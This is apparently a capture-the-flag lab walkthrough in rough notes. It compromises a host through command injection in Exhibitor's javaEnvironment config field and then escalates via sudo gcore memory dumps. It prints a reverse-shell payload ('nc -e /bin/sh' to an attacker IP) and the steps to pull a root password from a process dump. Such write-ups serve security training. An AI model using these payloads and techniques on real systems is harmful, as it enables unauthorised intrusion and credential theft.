nmap shows ports 22,2222 ssh, smb, 8080jetty, 8081 web, 631 (ipp ?)

we find oprt 8080 seemed plain, but 8081 took us to port 80, and in the page, we find the webpage is using Exhibitor v1.0
Search showed a public rce exploit that does it with a curl command
```txt
curl -X POST -d @data.json http://10.0.0.200:8080/exhibitor/v1/config/set

where, data.json is
```txt
data.json: { “zookeeperInstallDirectory”: “/opt/zookeeper”, “zookeeperDataDirectory”: “/opt/zookeeper/snapshots”, “zookeeperLogDirectory”: “/opt/zookeeper/transactions”, “logIndexDirectory”: “/opt/zookeeper/transactions”, “autoManageInstancesSettlingPeriodMs”: “0”, “autoManageInstancesFixedEnsembleSize”: “0”, “autoManageInstancesApplyAllAtOnce”: “1”, “observerThreshold”: “0”, “serversSpec”: “1:exhibitor-demo”, “javaEnvironment”: “$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)”, “log4jProperties”: “”, “clientPort”: “2181”, “connectPort”: “2888”, “electionPort”: “3888”, “checkMs”: “30000”, “cleanupPeriodMs”: “300000”, “cleanupMaxFiles”: “20”, “backupPeriodMs”: “600000”, “backupMaxStoreMs”: “21600000”, “autoManageInstances”: “1”, “zooCfgExtra”: { “tickTime”: “2000”, “initLimit”: “10”, “syncLimit”: “5”, “quorumListenOnAllIPs”: “true” }, “backupExtra”: { “directory”: “” }, “serverId”: 1 }
Mitigation
```
This wasnt really working, with some syntax issue. so we did it mannually. visited exhibitor/v1/config/ page, in the javeEnvironment field, entered the value `$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)` it gave us shell as charles

---
sudo -l reveals we can run the command "gcore" with sudo
-->gcore command generate coredumps of running processes, pointed to by its PID. the generated dump is binary, but we can use strings to narrow down on sensitive data

`cat /etc/crontab` shows a root process, /usr/bin/password-store
ps -ef shows the PID 513
`sudo gcore -a 513`
--> generates core.513 dump
`strings core.513` gives shows some strings, we sieve through, and get the root password, su root. we root!